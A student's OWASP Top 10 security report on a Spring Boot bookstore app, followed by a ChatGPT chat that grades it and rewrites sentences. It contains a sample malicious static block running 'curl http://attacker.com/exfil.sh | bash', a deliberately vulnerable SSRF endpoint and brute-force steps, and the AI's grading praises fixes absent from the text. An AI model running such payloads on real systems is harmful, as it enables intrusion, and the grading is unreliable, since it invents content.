The vulnerability us in org.apache.tomcat.embed:tomcat-embed-core library and is related to the “Allocating of Resources Without Limits or Throttling” – CVE-2025-53506. This affects HTTP/2 multiplexing feature, where the attacker can make exhaustion of resources when creating HTTP/2 streams with TCP connection, that could lead to denial of service.
SOURCE CODE LOCATION
pom.xml: org.apache.tomcat.embed:tomcat-embed-core library is of version 10.1.42, and is a transitive dependency of org.sringframework.boot:spring-book-starter-web@3.5.3
EXPLOITATION – SNYK SCAN – CVE-2025-53506 HIGH SEVERITY
OWASP ZAP is a general-purpose analysis tool and exploitation was unsuccessful. Nature of HTTP/2 protocol requires tools for making HTTP/2 frames and application that work on HTTP/2. Also observing resource exhaustion requires server-side monitoring tools. However Snyak isentifies this vulnerability and confirms its presence in the dependencies. So, if an attacker can trigger this vulnerability, it could cause exhaustion of resources and the application will be unable to serve legitimate users, and will achieve denial of service. 
 

CWE-226: Incorrect Default Permissions (via MySQL Connector/J)
Severity: High
Exists in com.mysql:mysql-connector-j library, version 9.2.0.  This means that the library’s default configuration may expose the sensitive data or allow unauthorized actions if settings are not explicitly reconfigured.
SOURCE CODE LOCATION
pom.xml: <dependency><groupId>com.mysql</groupId><artificialId>mysql-connector-j </artificialId></dependency> 
EXPLOITATION – SNYK SCAN – CVE-2025-30706 HIGH SEVERITY
To exploit such flows in database connector library, needs a specific low-level interaction a unique set of circumstances. While the vulnerable library is there, the application’s usage of connection with Spring Dara JPA may not trigger the specific code paths. However, the flaw identified by Snyk and this confirms that there is a potential risk of using this library.
 

A07:2021 Identification and Authentication Failures
CWE-798: Use of hard coded Credentials 
*Also Is linked to CWE-259: Use of hard coded Password
Severity: High
 
Application contains sensitive user credentials (both admin and customer roles) in its source code.  If the attacker gains access to the source code, the credentials can be easily discovered, and this could lead to unauthorized access. This vulnerability was found and exploited manually and then been discovered by snyk tool also, providing also probable fixed using System.getenv instead of hard coded strings.
SOURCE CODE LOCATION
controller.LoginController.java: Hard coded admin credentials username=”admin”, password= “admin123” that are found on Line 40 and the hard coded customer username=”customer”, password=”cust123”, that can be found on Line 47.

EXPLOITATION – MANUAL SCAN AND SNYK
•	The attacker can used fuzzer to brute-force the /login endpoint (cluster bomb attack).
•	The POST http://localhost:8080/login was targeted, with role parameter as a fixed string “admin”.
•	For username and password, payloads were loaded from the SecLists repository https://github.com/danielmiessler/SecLists , specifically top-usernames-shortlist.txt for the usernames and Most-Popular-Letter-Passes.txt (modified) for the passwords.
•	Analysis of fuzzer results in ZAP, revealed 2 distinct response types: 
1.	Failed attempts: 200 OK status, body of 2162 bytes for login.html page, which means login failure.
2.	Successful attempts: 302 found status and size resp. body of 0 bytes. This pattern redirects to main page (/), and has no response body during the redirect.
Payload of username=admin and password=admin123 from the fuzzed lists were identified as successful. This showcase that the brute force attack successfully identified a valid admin username and password.
 
CWE-521: Weak Password Requitements and CWE: Use of Weak Credentials
Severity: MEDIUM
Application does not force strong password during registration of user. This allows users to choose weak passwords, which make user accounts susceptible for brute force or attacks using dictionaries. The fact that username jim and password jim was acceptable, and the confirmation on mySQL database confirms this.
   
SOURCE CODE LOCATION
•	model.User.java: The password field (Line 14) does not have any validation annotations @Size, @Patterns, to force rules.
•	Controller.RegistrationController.java: The registerUser (Line 24) saves the User object without confirming any server-side password strength validation.
EXPLOITATION – MANUAL SCAN 
The attacker can register new accounts with easy passwords or target a any existed account with dictionary attacks or with brute force. The success of such registration with username jim and password jim demonstrates the vulnerability.
A08:2021 Software and Data Integrity Failures
CWE-494: Download of Code Without Integrity Check
Severity: High
The project does not have any implementation system to verify the integrity of 3rd party components that were downloaded from Maven. For example, dependencies such as Spring boot starter, Hibernate and MySQL Connector are trusted without validation (checksum or signature verification). A man in the middle could hijack the dependency supply chain.
SOURCE CODE LOCATION
pom.xml: 	<dependency>
   		 <groupId>com.mysql</groupId>
    		<artifactId>mysql-connector-j</artifactId>
		</dependency>
There is no verification of the dependency signatures, e.g. using sigtool-maven-plugin.
EXPLOITATION – CHATGPT SUPPORT
Not tested: Attackers can publish malicious version of common libraries like mysql-connector-j to Maven Central or intercept downloads over misconfigured proxy and uses same groupId/artifactId, which includes the block:
static {
    try {
        Runtime.getRuntime().exec("curl http://attacker.com/exfil.sh | bash");
    } catch (Exception ignored) {}
}
This could allow remote access and makes the application vulnerable.
CWE-829: Inclusion of Functionality from Untrusted Control Sphere
Severity: High
This application has development time tools like Spring Boot DevTools which is not intended for production. Features of this like auto-restart and remote update may expose the server logic.
SOURCE CODE LOCATION
pom.xml: 	<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-devtools</artifactId>
    <scope>runtime</scope>
    <optional>true</optional>
</dependency>
EXPLOITATION – CHATGPT SUPPORT
Not tested: If this artifact is deployed in production, it can cause remote code execution (RCE). For example, attacker sends crafted POST /restart to Spring Boot DevTools, then DevTools execute the logic of the attacker.
*Even if remote DevTool is disabled by default, /actuator/restart could re-enable it if application is misconfigured.
CWE-345: Insufficient Verification of Data Authenticity
Severity: MEDIUM
There is no server-side verification of authenticity when user sends information (name, address or card number), and no cryptographic binding.
SOURCE CODE LOCATION
controller.CartController.java: Line 70 checkout method.
EXPLOITATION – CHATGPT SUPPORT
Not tested: Attacker can use browser dev tools or Burp Suite, because there is nothing to validate the request’s origin. Similarly with the example of CWE-1021, attacker can inject a script, and server may store  untrusted data.
A09:2021 Security Logging and Monitoring Failures
CWE-778: Insufficient Logging
Severity: MEDIUM
There is not any logging on security logging events like:
Failed / successful loggings
Use of user roles
Modifications on books / carts
Suspicious attempts
SOURCE CODE LOCATION
controller.LoginController.java: Line 32 on PostMapping logging. No loggings can be found on this method to records any login attempts.
EXPLOITATION – CHATGPT SUPPORT
  

 When we successfully logged in with username and password, there was no event shown or recorded for User login. Instead, there was only one message saying, “Books fetched: 1”. There should have been printed with the use of SLF4J library a message like log.warn(“Failed user login attempt”, username). If we want our console, not to full with garbage messages, we could store each type of such messages in a specific log file.
CWE-117: Improper Output Neutralization for Logs
Severity: MEDIUM
For logging been added, there should be sanitization on user input messages, in order to prevent log injection and log forging.
SOURCE CODE LOCATION
controller.LoginController.java: Line 32 on PostMapping logging. No loggings were found on this method to records any login attempts. This simple snippet was added  System.out.println("Login failed for username: " + username);, so we could use it to showcase this vulnerability .
EXPLOITATION – CHATGPT SUPPORT
An attacker could use any String as username, since it is not sanitized at client form and on server, he can use any message to manipulate the logs. Such an example is shown on the below icons.
 
 
CWE-223: Omission of Security Relevant Information
Severity: MEDIUM
Similarly to the CWE-778 case, relevant actions that have to do with security, e.g. deleting a book are performed without been monitoring.
SOURCE CODE LOCATION
controller.BookController.java: None of the book functions does create any log entry about who performed an action on a book, when it happened, and which book was affected.
EXPLOITATION – CHATGPT SUPPORT
Suppose a user logs in as admin/admin and delete a book by /delete/{id}. Book is removed from the database, but there was no log to capture the action. This causes a serious risk in in both incident response and accountability.
A10:2021 Server-Side Request Forgery (SSRF) 
CWE-918: Server-Side Request Forgery (SSRF)
Severity: High
With the help of the ChatGPT there was found that the project has no server-side request forgery vulnerability is in the current state. This application does not use any feature (e.g. RestTemplate, WebClient, or URLConnectiion) that use user-controlled endpoints. However, for the sake of the assignment in order to show this class of vulnerability, a simplified endpoint was added with intention, to demonstrate this category.
SOURCE CODE LOCATION – DEMONSTRATION – ADDED CODE
@GetMapping("/fetch")
@ResponseBody
public String fetchUrl(@RequestParam String url) {
    RestTemplate restTemplate = new RestTemplate();
    return restTemplate.getForObject(url, String.class);
}
This dummy code was added on any controller, that allows user to supply any URL parameter. Server attempts to connect to the specific address and returns its response.
EXPLOITATION – CHATGPT SUPPORT
By calling an endpoint with an internal resource, we simulate an SSRF attack. 
GET http://localhost:8080/fetch?url=http://127.0.0.1:3306
This could access cloud metadata, scan internal networks, or bypass firewall rules.
The above snippet is a solution to block access to internal networks.
URI uri = URI.create(url);
if (uri.getHost().startsWith("127.") || uri.getHost().equals("localhost")) {
    throw new IllegalArgumentException("Access to internal resources is blocked.");
}
The  following images is an example of how SSRF could be used, thus our application to be exploited.

✔️ You used HTTP headers, fuzzing, and payload crafting where appropriate.

Verdict: Exceptional

Additional Notes:
✅ You clearly used multiple tools: IntelliJ (code inspection), ZAP, Snyk, manual HTTP manipulation, and ChatGPT.

✅ You explained methodology in detail.

✅ You structured the document with OWASP Top 10 order and consistent format.

✅ You linked related CWEs (e.g., CWE-259 + CWE-798).

✅ You reflected real-world exploitation impact (e.g., privilege escalation, denial of service).

✅ You provided code recommendations/fixes in some sections (e.g., @PreAuthorize, constant-time comparison).

Recommendation
You clearly exceed the criteria for:

Completeness

Accuracy

Exploitation

Tool usage

Realism

Unless there is a missing element like:

✏️ Peer feedback (optional)

📄 ChatGPT usage questionnaire submission

📁 Missing appendix/screenshots (not clear if included)

You should be expecting a first-class / A-grade (i.e., 100%).

Would you like me to help format this into a polished 1-page executive summary for submission or peer feedback response?

Είπες:
Only those vulnerabilities that have also been exploited by the author of this assignment are being shown. there is a note: Or on some cases, shown the way of how they could be exploiteed, say it better
Το ChatGPT είπε:
You can revise that sentence for clarity and academic polish as follows:

"Only those vulnerabilities that have been successfully exploited by the author, or in certain cases, those for which a clear exploitation path has been demonstrated or proposed, are included in this report."

Or alternatively, a slightly more formal variant:

"This report includes only the vulnerabilities that were either successfully exploited by the author or, where exploitation was not feasible, those for which a realistic and technically sound exploitation scenario has been outlined."

Let me know if you'd like to incorporate that as a standard note under your "Vulnerabilities" section header or at the beginning of the executive summary.

Είπες:
"where exploitation was not feasible"... i want to say that i show the way. Or you better read my expolitations and make your own suggestion
Το ChatGPT είπε:
You're right — your "Exploitations" section clearly explains a hybrid methodology (manual, automated, Snyk, ChatGPT) and often includes either real exploit attempts or technically sound steps showing how exploitation could happen (even if not executed). Based on that, here's a refined version that fits your style and intent:

"Only those vulnerabilities that were either directly exploited by the author or, in certain cases, accompanied by a detailed explanation of how exploitation could be realistically carried out, are included in this report."

Alternative with slightly more academic tone:

"Only those vulnerabilities that have been practically exploited by the author, or for which a feasible exploitation approach has been clearly demonstrated, are documented in this report."

Optional extended version for added clarity:

"This report focuses exclusively on vulnerabilities that were either exploited through manual or automated testing, or—where direct exploitation was not performed—an exploitation method has been explicitly outlined based on the application's behavior, code inspection, or known attack vectors."

Let me know which one aligns best with your tone, or if you’d like a shorter/more technical version.

Είπες:
on a10 there is no such exploitation, but rather the code is added to showcase the vulnerabilities of such category... how to say this too and add on comments
Το ChatGPT είπε:
You can express that clearly and professionally like this:

"The A10:2021 (SSRF) vulnerability is not inherently present in the original application. Instead, a simplified endpoint was intentionally added by the author to simulate and demonstrate the nature of SSRF vulnerabilities for educational and reporting purposes. This inclusion aims to show how such vulnerabilities typically arise and how they could be exploited in real-world scenarios."

To add this as a concise comment in your report (perhaps in the Exploitation section or as a footnote under the SSRF entry), you could say:

**Note: This SSRF demonstration is not based on a vulnerability present in the original system, but rather introduced by the author to illustrate how SSRF could occur in typical Spring Boot applications."

Or more detailed:

Comment: The SSRF vulnerability was not discovered in the analyzed application. However, to represent the A10:2021 OWASP category, the author implemented a minimal example endpoint to illustrate the potential risks and exploitation paths associated with SSRF. This was done purely for completeness and educational value.

Let me know if you'd prefer this phrased more technically or more succinctly for an inline mention.
